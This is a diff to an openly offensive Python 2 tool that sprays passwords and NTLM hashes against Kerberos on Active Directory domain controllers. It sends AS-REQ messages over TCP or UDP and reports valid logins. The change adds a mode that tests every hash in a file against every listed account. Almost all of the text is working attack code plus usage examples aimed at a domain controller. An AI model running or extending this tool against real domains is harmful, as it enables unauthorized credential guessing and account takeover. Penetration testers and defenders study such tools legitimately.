@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python2
 import sys, os
 import socket
 from random import getrandbits
@@ -10,8 +10,7 @@ from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormat
 from pyasn1.codec.der.encoder import encode
 from struct import pack, unpack
 from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
-from Crypto.Cipher import ARC4
-from Crypto.Cipher import MD4, MD5
+from _crypto import ARC4, MD5, MD4
 from time import time, gmtime, strftime, strptime, localtime
 import hmac as HMAC
 from random import getrandbits, sample
@@ -253,9 +252,6 @@ def _decrypt_rep(data, key, spec, enc_spec, msg_type):
     
 
 def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
-
-
-
     nonce = getrandbits(31)
     current_time = time()
     as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
@@ -269,9 +265,6 @@ def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
                 print('[+] Valid Login: %s:%s'%(user_name,orgin_key))
 
 def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):
-
-
-
     nonce = getrandbits(31)
     current_time = time()
     as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
@@ -293,14 +286,15 @@ if __name__ == '__main__':
         print('  https://github.com/ropnop/kerbrute')
         print('  https://github.com/mubix/pykek')
         print('Author: 3gstudent')
-	print('Usage:')
-	print('	%s <domainControlerAddr> <domainName> <file> <passwordtype> <data> <mode>'%(sys.argv[0]))
+        print('Usage:')
+        print('	%s <domainControlerAddr> <domainName> <file> <passwordtype> <data> <mode>'%(sys.argv[0]))
         print('<passwordtype>: clearpassword or ntlmhash')
         print('<mode>: tcp or udp')
-	print('Eg.')
-	print('	%s 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp'%(sys.argv[0]))
-	print('	%s 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp'%(sys.argv[0]))
-	sys.exit(0)
+        print('Eg.')
+        print('	%s 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp'%(sys.argv[0]))
+        print('	%s 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp'%(sys.argv[0]))
+        print('	%s 192.168.1.1 test.com user.txt ntlmhashfile hash.txt udp'%(sys.argv[0]))
+        sys.exit(0)
     else:
         kdc_a = sys.argv[1]
         user_realm = sys.argv[2].upper()
@@ -316,7 +310,30 @@ if __name__ == '__main__':
         elif sys.argv[4]=='ntlmhash':
             print('[*] NTLMHash:            %s'%(sys.argv[5]))
             user_key = (RC4_HMAC, sys.argv[5].decode('hex'))
-            
+        elif sys.argv[4]=='ntlmhashfile':
+            print('[*] NTLMHashfile:            %s'%(sys.argv[5]))
+            hashfile = open(sys.argv[5],'r')
+            if sys.argv[6]=='tcp':
+                print('[*] Using TCP to test a list of hashes against a list of Active Directory accounts.')
+                for hash in hashfile.readlines():
+                    hash2 = hash.strip("\n").decode('hex')
+                    user_key = (RC4_HMAC, hash2)
+                    file_object = open(sys.argv[3], 'r')
+                    for line in file_object:
+                        passwordspray_tcp(user_realm, line.strip('\r\n'), user_key, kdc_a, hash)
+                sys.exit(0)
+            elif sys.argv[6]=='udp':
+                print('[*] Using UDP to test a list of hashes against a list of Active Directory accounts.')  
+                for hash in hashfile.readlines():
+                    hash2 = hash.strip("\n").decode('hex')
+                    user_key = (RC4_HMAC, hash2)
+                    file_object = open(sys.argv[3], 'r')
+                    for line in file_object:
+                        passwordspray_udp(user_realm, line.strip('\r\n'), user_key, kdc_a, hash)
+                sys.exit(0)
+            else:
+                print('[!]Wrong parameter of <mode>')
+                sys.exit(0)  
         else:
             print('[!]Wrong parameter of <passwordtype>')
             sys.exit(0)     
@@ -334,8 +351,5 @@ if __name__ == '__main__':
         else:
             print('[!]Wrong parameter of <mode>')
             sys.exit(0)     
-
-
         print('All done.')
         
-
